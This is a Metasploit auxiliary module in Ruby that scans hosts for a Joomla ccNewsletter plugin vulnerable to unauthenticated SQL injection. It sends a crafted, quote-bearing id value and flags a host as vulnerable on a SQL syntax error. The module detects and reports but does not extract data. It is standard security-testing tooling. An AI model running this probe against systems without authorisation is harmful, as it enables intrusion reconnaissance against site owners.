##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Joomla ccNewsletter SQL Injection Scanner',
      'Description' => %q{
This module scans for instances of Joomla with vulnerable ccNewsletter installed.

The ccNewsletter Joomla plugin below version 2.1.10 suffered from an unauthenticated
SQL injection vulnerability. The ccNewletter plugin is a popular plugin used to manage
newsletters within the Joomla CMS.

Categories: Open Source, Joomla

Price: 0

Video: none

OS: Multi

Arch: Multi

Requirements: Metasploit Framework
      },
      'Author'       => [],
      'License'     => 'VolatileMinds'
    )

    register_options(
      [
        OptString.new('PATH', [ true,  "The test path to find Joomla", '/']),
      ], self.class)

  end

  def run_host(target_host)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php?option=com_ccnewsletter&task=viewNewsletter&id=MSc6OzA=&Itemid=103')
    })

    if res.code == 500 && res.body =~ /error in your SQL syntax/
      print_good("#{peer} - Found vulnerable ccNewsletter instance")
      report_service({
        host: target_host,
        port: datastore['RPORT'],
        name: 'Joomla ccNewsletter',
        info: 'Joomla with ccNewsletter vulnerable to SQL injection'
      })
    end
  end
end
